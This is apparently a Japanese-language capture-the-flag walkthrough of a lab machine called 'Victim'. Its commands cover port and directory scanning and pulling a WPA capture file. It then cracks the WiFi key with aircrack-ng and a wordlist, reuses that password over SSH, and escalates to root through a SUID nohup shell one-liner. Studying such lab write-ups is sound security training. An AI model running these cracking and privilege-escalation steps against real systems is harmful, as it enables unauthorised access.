## Victim
### 事前準備
  - rockyou.txt.gzファイルを解凍する
  - gunzip /usr/share/wordlists/rockyou.txt.gz 
### ポートスキャンまでは同じ
- `fping`を受け付けないこともあるので、`arp-scan`を使う
  - fpingはicmpプロトコルを飛ばしている
  - arp-scanはarpプロトコルを飛ばしている 
- ポート22, 80, 8080, 8999, 9000が開いている

### ブラウザで80,8080,8999の各サイトを見てみる
- html,robots.txt

### gobusterで80, 8080を見る   
- `gobuster dir -u 192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50`
  - `-x`のオプションがあると拡張子を指定できる。ただし時間がかかる 
  - `-u` オプションは、リンクの次から順に検索していく
  - `-t`はスレッドの数を指定できる。デフォルトは10で、50だと３割くらい早くなる
- 8080ポートでもやってみる、この場合はhttp://$IP:8080。するとpasswordsテキストがある。中身を見てみると、、

### pcapファイルを取得
  - pcapファイルを取得する方法は２つある
  1. 8999ポートのブラウザにアクセスする、こういう表示をディレクトリリスティングと呼ぶ。本来はディレクトリなんだが、見やすいようにブラウザが見やすいようにしている
  2. WPA-01.capファイルをダウンロードする。
  3. `wget http://192.168.56.106:8999/WPA-01.cap`

### (補足)wiresharkの設定
- 見やすいようにする
- `view` -> `PacketBytes`のチェックリストを外す 
### wiresharkを起動して中身をチェックする
- `wireshark  WPA-01.cap`とターミナルで入力
- 全体を見るために、Statics -> Protocol Hierarchyを見る、wireless LANとあることからwifiのパケットであることがわかる
- SSIDは無線LANの識別IDで要はユーザ名のことで、ここではdlinkというユーザがいることがわかる
- 暗号化がwpa1で弱いことがわかる

### wiresharkを起動して中身をチェックしてユーザ名を見つける
- 虫メガネアイコンをクリックするとバーが下に出てくる
- Case sensitiveのとこにリストがあるのでDisplay fileterをStringにする
- 右側のとこにSSIDと入力する。SSIDはユーザ名のこと
- ユーザ名のところが青くなる。ユーザ名はdlink

### 暗号解読
- 次の2つは辞書が異なるだけで、どちらでもできる
- 本に書いてるの
  - `aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt`
  - パスワードがわかる
- ParrotOSにはwifi専用のパスワード辞書があるので、それでやってみる
  - `aircrack-ng WPA-01.cap -w /usr/share/wordlists/wifite.txt` 
### sshで接続する
- ユーザとwifiのパスワードをsshでも使い回していると仮定してssh接続をする
- `ssh dlink@$IP`
- OSを特定する
- 個人で使える管理者権限を調べる

### SUIDファイルを特定する
- `find / -perm -4000 -ls 2> /dev/null`
  - `-ls`はロングフォーマットで表示する
- どっちでもいい
- `find / -perm -u=s -type f 2> /dev/null` 

### nohupコマンドでルートシェルを奪う
- `nohup /bin/sh -p -c "sh -p < $(tty) > $(tty) 2> $(tty)"`
  - GTFOBinsのSUIDのところにも書いてある
  - nohupコマンドはターミナルを閉じてもコマンドは継続して実行したいときに使うコマンド
  - -pは実ユーザと実際のユーザが異なる時につけるオプション。これがないと、ルートにはなれない
  - $(tty)はドルパーレンと呼ぶ、単に先にコマンドを実行しているだけ
  - `< $(tty)`標準入力
  - `> $(tty)`標準出力
  - `2> $(tty)`エラー出力
### rootを取得
  - `cd /root`
  - `ls`
  - `cat flag.txt`
